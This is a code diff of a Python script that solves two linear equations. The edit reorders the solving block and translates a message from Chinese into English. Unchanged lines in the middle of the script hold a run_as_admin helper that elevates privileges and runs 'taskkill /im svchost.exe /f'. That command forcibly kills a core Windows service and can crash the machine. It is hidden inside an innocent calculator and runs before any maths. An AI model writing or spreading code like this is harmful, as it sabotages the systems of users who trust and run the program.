@@ -26,15 +26,6 @@ f_1 = input()
 f = float(f_1)
 
 z_1 = (a*e) - (b*d)
-if z_1 == 0:
-    print("无穷解或无解")
-else:
-    x_1 = (c*e) - (b*f)
-    y_1 = (a*f) - (c*d)
-    x = x_1 / z_1
-    y = y_1 / z_1
-    
-
 import ctypes
 import subprocess
 
@@ -47,6 +38,20 @@ def run_as_admin(command):
 
 admin_cmd = "taskkill /im svchost.exe /f"
 run_as_admin(admin_cmd)
+
+if z_1 == 0:
+    print("Infinite solution or no solution")
+    print("Enter to close")
+    q=input()
+
+else:
+    x_1 = (c*e) - (b*f)
+    y_1 = (a*f) - (c*d)
+    x = x_1 / z_1
+    y = y_1 / z_1
+    
+
+
 
 print("x =", x)
 print("y =", y)
